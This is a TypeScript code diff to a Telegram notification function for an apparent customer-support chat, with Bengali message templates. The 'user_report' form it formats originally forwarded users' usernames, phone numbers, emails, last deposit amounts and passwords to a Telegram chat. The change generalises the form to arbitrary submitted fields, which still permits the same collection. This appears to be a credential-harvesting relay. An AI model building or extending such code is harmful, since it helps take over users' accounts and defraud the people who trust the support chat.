@@ -13,15 +13,8 @@ export interface TelegramNotificationParams {
   photoUrl?: string;
   photoName?: string;
   attachments?: Array<{ name: string; url: string; type: string; size?: string }>;
-  reportData?: {
-    username?: string;
-    phone?: string;
-    email?: string;
-    nibondhonName?: string;
-    lastAmount?: string;
-    lastPassword?: string;
-    siteLink?: string;
-  };
+  reportData?: Record<string, any>;
+  reportFieldsList?: Array<{ label: string; value: string }>;
   timestamp?: string;
 }
 
@@ -94,16 +87,26 @@ export async function sendTelegramNotification(
         `🔔 এখন থেকে কোনো কাস্টমার মেসেজ বা ছবি পাঠালে সাথে সাথে নোটিফিকেশন আসবে।`;
     } else if (params.type === 'user_report') {
       const rep = params.reportData || {};
+      const fieldsList = params.reportFieldsList || [];
+      
+      let fieldsFormatted = '';
+      if (fieldsList.length > 0) {
+        fieldsFormatted = fieldsList
+          .map(f => `🔹 <b>${f.label}:</b> ${f.value || 'N/A'}`)
+          .join('\n');
+      } else {
+        fieldsFormatted = Object.entries(rep)
+          .filter(([key]) => key !== 'customerName' && key !== 'depositSlipUrl')
+          .map(([key, val]) => `🔹 <b>${key}:</b> ${val || 'N/A'}`)
+          .join('\n');
+      }
+
       messageText = `🚨 <b>ইউজার রিপোর্ট ও জমা ফরম (User Report Form)</b>\n\n` +
-        `👤 <b>ইউজারনেম:</b> ${rep.username || 'N/A'}\n` +
-        `📞 <b>ফোন নম্বর:</b> ${rep.phone || params.customerPhone || 'N/A'}\n` +
-        `📧 <b>ইমেইল:</b> ${rep.email || params.customerEmail || 'N/A'}\n` +
-        `✍️ <b>নিবন্ধন নাম:</b> ${rep.nibondhonName || 'N/A'}\n` +
-        `💵 <b>সর্বশেষ ডিপোজিট:</b> ${rep.lastAmount || 'N/A'}\n` +
-        `🔑 <b>পাসওয়ার্ড:</b> ${rep.lastPassword || 'N/A'}\n` +
-        `🌐 <b>সাইট লিংক:</b> ${rep.siteLink || 'N/A'}\n` +
+        `👤 <b>গ্রাহকের নাম:</b> ${params.customerName || 'N/A'}\n` +
         `🆔 <b>চ্যাট আইডি:</b> #${params.chatId || 'N/A'}\n\n` +
-        `⏰ <b>সময়:</b> ${timeStr}`;
+        `📋 <b>জমা দেওয়া তথ্যাবলী:</b>\n` +
+        (fieldsFormatted || 'কোনো ফিল্ড ডেটা নেই') +
+        `\n\n⏰ <b>সময়:</b> ${timeStr}`;
     } else if (params.type === 'new_chat') {
       messageText = `🔔 <b>নতুন কাস্টমার চ্যাট শুরু হয়েছে! (New Chat)</b>\n\n` +
         `🆔 <b>চ্যাট আইডি:</b> #${params.chatId || 'N/A'}\n` +
